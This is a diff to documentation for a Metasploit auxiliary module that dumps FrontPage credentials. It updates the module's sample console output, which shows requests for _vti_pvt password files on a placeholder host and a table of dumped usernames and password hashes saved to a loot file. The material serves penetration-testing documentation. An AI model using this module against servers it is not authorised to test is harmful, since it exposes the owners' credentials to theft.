@@ -24,19 +24,20 @@ run
 msf auxiliary(scanner/http/frontpage_credential_dump) > run
 
 [+] 10.10.10.10 - service.pwd
-[+] # -FrontPage-
-[+] username:kLAsISPJ8AsaQ
-
 [+] 10.10.10.10 - administrators.pwd
-[+] # -FrontPage-
-[+] username:wMyvw3d3c1oWU
-
 [+] 10.10.10.10 - authors.pwd
-[+] # -FrontPage-
-[+] username:wMyvw3d3c1oWU
 
-[*] Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
+FrontPage Credentials
+=====================
+
+ Source          Username    Password Hash
+ ------          --------    -------------
+ Administrators  e-scan.com  xMyvw4d3c1oWY
+ Authors         e-scan.com  xMyvw4d3c1oWY
+ Service         e-scan.com  jLAsITPJ8AsaR
+
+[*] Credentials saved in: /root/.msf4/loot/20180921124147_default_10.10.10.10_frontpage.creds_096592.txt
+
 ```
 
 ## Verbose Output
@@ -47,23 +48,23 @@ msf auxiliary(scanner/http/frontpage_credential_dump) > run
 [*] Found /about/_vti_pvt/service.pwd.
 [*] Found FrontPage credentials.
 [+] 10.10.10.10 - service.pwd
-[+] # -FrontPage-
-[+] username:kLAsISPJ8AsaQ
-
 [*] Requesting: /about/_vti_pvt/administrators.pwd
 [*] Found /about/_vti_pvt/administrators.pwd.
 [*] Found FrontPage credentials.
 [+] 10.10.10.10 - administrators.pwd
-[+] # -FrontPage-
-[+] username:wMyvw3d3c1oWU
-
 [*] Requesting: /about/_vti_pvt/authors.pwd
 [*] Found /about/_vti_pvt/authors.pwd.
 [*] Found FrontPage credentials.
 [+] 10.10.10.10 - authors.pwd
-[+] # -FrontPage-
-[+] username:wMyvw3d3c1oWU
 
-[*] Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
+FrontPage Credentials
+=====================
+
+ Source          Username    Password Hash
+ ------          --------    -------------
+ Administrators  e-scan.com  xMyvw4d3c1oWY
+ Authors         e-scan.com  xMyvw4d3c1oWY
+ Service         e-scan.com  jLAsITPJ8AsaR
+
+[*] Credentials saved in: /root/.msf4/loot/20180921124828_default_10.10.10.10_frontpage.creds_090555.txt
 ```
